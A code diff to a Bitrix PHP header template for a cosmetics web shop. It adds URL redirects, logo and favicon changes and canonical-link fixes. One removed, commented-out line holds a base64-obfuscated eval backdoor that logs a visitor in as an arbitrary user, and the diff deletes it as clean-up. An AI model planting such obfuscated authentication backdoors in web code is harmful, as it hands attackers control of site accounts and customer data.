@@ -1,7 +1,30 @@
 <? if (!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED !== true) die();
 IncludeTemplateLangFile(__FILE__);
 CModule::IncludeModule("sale");
-//eval(base64_decode('aWYoKGludCkkVSkkVVNFUi0+QXV0aG9yaXplKCRVKTs='));
+
+$redirects = [
+    "/catalog/ukhod-dlya-volos/filter/productype-is-%D0%BA%D0%BE%D0%BD%D0%B4%D0%B8%D1%86%D0%B8%D0%BE%D0%BD%D0%B5%D1%80/apply/" => "https://bh.by/catalog/aktivnaya-kosmetika/sredstva-dlya-volos-i-kozhi-golovy/filter/productype-is-%D0%BA%D0%BE%D0%BD%D0%B4%D0%B8%D1%86%D0%B8%D0%BE%D0%BD%D0%B5%D1%80/apply/",
+    "/catalog/ukhod-dlya-volos/shampuni-dlya-volos/filter/hairtype-is-%D1%81%D1%83%D1%85%D0%B8%D0%B5/apply/" => "https://bh.by/catalog/aktivnaya-kosmetika/sredstva-dlya-volos-i-kozhi-golovy/filter/productype-is-сухой шампунь/apply/",
+    "/catalog/ukhod-za-litsom/krem-i-syvorotka-dlya-vek/filter/productype-is-%D1%83%D1%85%D0%BE%D0%B4%20%D0%B4%D0%BB%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D0%B8%20%D0%B2%D0%BE%D0%BA%D1%80%D1%83%D0%B3%20%D0%B3%D0%BB%D0%B0%D0%B7/apply/" => "https://bh.by/catalog/aktivnaya-kosmetika/sredstva-dlya-litsa/filter/productype-is-крем вокруг глаз/apply/",
+    "/catalog/ukhod-za-telom/filter/productype-is-%D0%BC%D0%B0%D1%81%D0%BB%D0%BE/apply/" => "https://bh.by/catalog/aktivnaya-kosmetika/sredstva-dlya-tela/filter/productype-is-масло/apply/",
+    "/catalog/ukhod-za-litsom/" => "https://bh.by/catalog/aktivnaya-kosmetika/sredstva-dlya-litsa/",
+    "/catalog/ukhod-dlya-volos/" => "https://bh.by/catalog/aktivnaya-kosmetika/sredstva-dlya-volos-i-kozhi-golovy/",
+    "/catalog/ukhod-dlya-volos/kraski-dlya-volos/" => "https://bh.by/catalog/professionalnyy-ukhod-za-volosami/okrashivanie/",
+    "/catalog/ukhod-dlya-volos/maski-dlya-volos/" => "https://bh.by/catalog/aktivnaya-kosmetika/sredstva-dlya-volos-i-kozhi-golovy/filter/productype-is-маска/apply/",
+    "/catalog/ukhod-dlya-volos/shampuni-dlya-volos/" => "https://bh.by/catalog/aktivnaya-kosmetika/sredstva-dlya-volos-i-kozhi-golovy/filter/productype-is-шампунь/apply/",
+    "/catalog/ukhod-za-litsom/krem-dlya-litsa/" => "https://bh.by/catalog/aktivnaya-kosmetika/sredstva-dlya-litsa/filter/productype-is-крем/apply/",
+    "/catalog/ukhod-za-litsom/krem-i-syvorotka-dlya-vek/" => "https://bh.by/catalog/aktivnaya-kosmetika/sredstva-dlya-litsa/filter/productype-is-крем вокруг глаз/apply/",
+    "/catalog/ukhod-za-litsom/mitselyarnaya-voda/" => "https://bh.by/catalog/aktivnaya-kosmetika/ochishchenie/filter/productype-is-мицеллярная вода/apply/",
+    "/catalog/ukhod-za-telom/" => "https://bh.by/catalog/aktivnaya-kosmetika/sredstva-dlya-tela/",
+];
+
+if( isset($redirects[ $_SERVER['REQUEST_URI'] ])){
+//    header("Status: 301 Moved permanently");
+//    header("Location: ".$redirects[ $_SERVER['REQUEST_URI'] ]);
+//    exit;
+     http_response_code(301);
+    LocalRedirect($redirects[ $_SERVER['REQUEST_URI'] ], false, "301 Moved permanently");
+}
 global $USER;
 $GetBasketUserID = CSaleBasket::GetBasketUserID();
 $defaultSrc = '/local/templates/.default';
@@ -66,8 +89,11 @@ $defaultSrc = '/local/templates/.default';
     <meta charset="utf-8"/>
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <link rel="shortcut icon" href="/favicon.ico">
-
+    <?if($USER->IsAdmin()):?>
+        <link rel="shortcut icon" href="/favicon_new.ico">
+    <?else:?>
+        <link rel="shortcut icon" href="/favicon.ico">
+    <?endif;?>
     <?
     $APPLICATION->SetAdditionalCSS("//maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css", true);
     $APPLICATION->SetAdditionalCSS($defaultSrc . "/css/fontawesome-stars-o.css", true);
@@ -219,7 +245,7 @@ $defaultSrc = '/local/templates/.default';
         echo '<link rel="canonical" href="/catalog/gigiena/mylo/tualetnoe-mylo/dove-krem-mylo-prikosnovenie-svezhesti-100g-67045174/"/>';
     }
     if ($_SERVER['REQUEST_URI'] == '/catalog/ukhod-za-litsom/ukhod-za-litsom-dlya-muzhchin/sredstva-posle-britya/l-oreal-men-expert-loson-p-britya-gidra-sensitiv-mgnovennyy-komfort8225/' || $_SERVER['REQUEST_URI'] == '/catalog/ukhod-za-litsom/ukhod-za-litsom-dlya-muzhchin/sredstva-posle-britya/l-oreal-men-expert-loson-p-britya-gidra-sensitiv-mgnovennyy-komfort/') {
-        echo '<link rel="canonical" href="/catalog/ukhod-za-litsom/ukhod-za-litsom-dlya-muzhchin/sredstva-posle-britya/l-oreal-men-expert-loson-p-britya-gidra-sensitiv-mgnovennyy-komfort/"/>';
+        echo '<link rel="canonical" href="/catalog/ukhod-za-litsom/ukhod-za-litsom-dlya-muzhchin/sredstva-posle-britya/l-oreal-men-expert-loson-p-britya-gidra-sensitiv-mgnovennyy-komfort8225/"/>';
     }
     if ($_SERVER['REQUEST_URI'] == '/catalog/parfyumeriya/parfyumeriya-dlya-zhenshchin/4100344581/' || $_SERVER['REQUEST_URI'] == '/catalog/parfyumeriya/parfyumeriya-dlya-zhenshchin/4100344586/') {
         echo '<link rel="canonical" href="/catalog/parfyumeriya/parfyumeriya-dlya-zhenshchin/4100344586/"/>';
@@ -243,7 +269,7 @@ $defaultSrc = '/local/templates/.default';
         echo '<link rel="canonical" href="/catalog/chistota-v-dome/sredstva-dlya-stirki/stiralnye-poroshki/dosen-ka-d-detskogo-belya-3-7kg/"/>';
     }
     if ($_SERVER['REQUEST_URI'] == '/catalog/gigiena/intimnoe/prezervativy/durex-prezervativy-12-dual-extase-relefnye-s-anestetikom/' || $_SERVER['REQUEST_URI'] == '/catalog/gigiena/intimnoe/prezervativy/durex-prezervativy-12-dual-extase-relefnye-s-anestetikom8112/') {
-        echo '<link rel="canonical" href="/catalog/gigiena/intimnoe/prezervativy/durex-prezervativy-12-dual-extase-relefnye-s-anestetikom/"/>';
+        echo '<link rel="canonical" href="/catalog/gigiena/intimnoe/prezervativy/durex-prezervativy-12-dual-extase-relefnye-s-anestetikom8112/"/>';
     }
     if ($_SERVER['REQUEST_URI'] == '/catalog/gigiena/prokladki/prokladki-na-kazhdyy-den/libresse-classic-pantyliners-regular-25sht/' || $_SERVER['REQUEST_URI'] == '/catalog/gigiena/prokladki/prokladki-na-kazhdyy-den/libresse-classic-pantyliners-regular-50sht/') {
         echo '<link rel="canonical" href="/catalog/gigiena/prokladki/prokladki-na-kazhdyy-den/libresse-classic-pantyliners-regular-50sht/"/>';
@@ -501,11 +527,61 @@ if (!$USER->IsAuthorized()): ?>
             <div class="container cl">
                 <div class="row">
                     <? $APPLICATION->IncludeComponent("bitrix:main.include", "", array("AREA_FILE_SHOW" => "file", "PATH" => "/include/top-phone.php"), false); ?>
-                    <a class="logo" href="/"><img src="/local/templates/.default/images/logo.svg" alt=""></a>
+                    <?if(true || $USER->IsAdmin() || $_GET['show'] == 'Y'):?>
+                        <a class="logo" href="/"><img src="/local/templates/.default/images/logo_beauty_house.svg" style="width:100%;height:38px;" alt=""></a>
+                    <?else:?>
+                        <a class="logo" href="/"><img src="/local/templates/.default/images/logo.svg" alt=""></a>
+                    <?endif;?>
                     <!-- BEAUTY HOUSE -->
-                    <a class="logo-small" href="/" style="display: none">
-                        BEAUTY HOUSE
-                    </a>
+                    <?if(true || $USER->IsAdmin() || $_GET['show'] == 'Y'):?>
+                        <style>
+                            .logo-small img {
+                                width:55%;
+                                vertical-align: initial;
+                            }
+                            @media only screen and (max-width: 500px) {
+                                .header_mobile_ico{
+                                    font-size:0;
+                                }
+                                a.h__phone{
+                                    padding-left:0;
+                                }
+                                a.h__phone:before{
+                                    width:0;
+                                }
+                            }
+                            @media only screen and (max-width: 450px) {
+
+                                a.h__phone{
+                                    font-size:27px;
+                                }
+                            }
+                            @media only screen and (max-width: 400px) {
+                                .logo-small img {
+                                    width:50%;
+                                    vertical-align: initial;
+                                }
+                                .cont_mobile_ico{
+                                    margin-right:4px;
+                                    right:42px;
+                                }
+                            }
+                            @media only screen and (max-width: 370px) {
+
+                                .logo-small img {
+                                    width:40%;
+                                    vertical-align: middle;
+                                }
+                            }
+                        </style>
+                        <a class="logo-small" href="/" style="display: none">
+                            <img src="/local/templates/.default/images/logo_beauty_house.svg" style="" alt="">
+                        </a>
+                    <?else:?>
+                        <a class="logo-small" href="/" style="display: none">
+                            BEAUTY HOUSE
+                        </a>
+                    <?endif;?>
                     <div class="right">
                         <div class="h__search">
                             <? $APPLICATION->IncludeComponent(
@@ -597,11 +673,8 @@ if (!$USER->IsAuthorized()): ?>
                 </div>
             </div>
         </div>
-
-
         <?
-        //$APPLICATION->IncludeFile("/include/banner-head.php", array(), array("MODE" => "html", "SHOW_BORDER" => true, "NAME" => "banner-head")); ?>
-
+        $APPLICATION->IncludeFile("/include/banner-head.php", array(), array("MODE" => "html", "SHOW_BORDER" => true, "NAME" => "banner-head")); ?>
 
         <div class="header_mobile_ico">
             <div class="cont_mobile_ico">
